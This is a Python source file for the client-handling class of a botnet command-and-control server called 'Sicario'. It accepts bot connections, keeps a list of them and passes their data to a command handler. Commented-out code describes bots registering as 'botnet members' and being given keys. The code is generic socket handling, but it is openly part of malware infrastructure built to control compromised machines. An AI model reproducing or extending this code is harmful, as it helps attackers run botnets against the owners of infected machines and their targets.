#!/usr/bin/python

import sicario
import log
import commands
import client

# Sicario C&C server 
# Client class

from threading import Thread

clients = []

class Client (Thread):
	def __init__ (self, sock, sema):
		super(Client, self).__init__()
		self.sock = sock
		self.sock.settimeout(10)
		self.sema = sema
		self.connection = True
		
	def run (self):
		log.log('{} connected! (socket level) ({} clients now)'.format(self.sock.getpeername()[0], len(clients)))
		clients.append(self)
		while self.connection == True:
			data = self.sock.recv(1024).strip('\n')
			if not data: 
				clients.remove(self)
				log.log('{} disconnected! (socket level) ({} clients left)'.format(self.sock.getpeername()[0], len(clients)))
				self.sock.close()
				break
				
			highClient = client.Client(self.sock.getpeername()[0], self)
			highClient.on_command(data)
			
			## lets parse command
			#arguments = commands.parse(data)
			
			# first command should be registering as botnet member.
			
		#	if arguments[0] != 'register':
		#		clients.remove(self)
		#		log.log('{} disconnected! Failed handshake ({} clients left)'.format(self.sock.getpeername()[0], len(clients)))
		#		self.sock.close()
		#		break
				
			# new botnet member
		#	if len(arguments) != 2:
		#		log.log('{} is new botnet member! Generating random key... '.format(self.sock.getpeername()[0], len(clients)))
		#		key = hashlib.md5(str(time.time()*100000)).hexdigest().upper()
		#		log.log('Random key generated for {}: {}'.format(self.sock.getpeername()[0], key))
		#		command = commands.encode(['set','key',key])
		#		self.sock.send(command)
	def send(self, arg):
		self.sock.send(arg)
		
	def stop(self):
		self.connection = False
		self.sock.close()
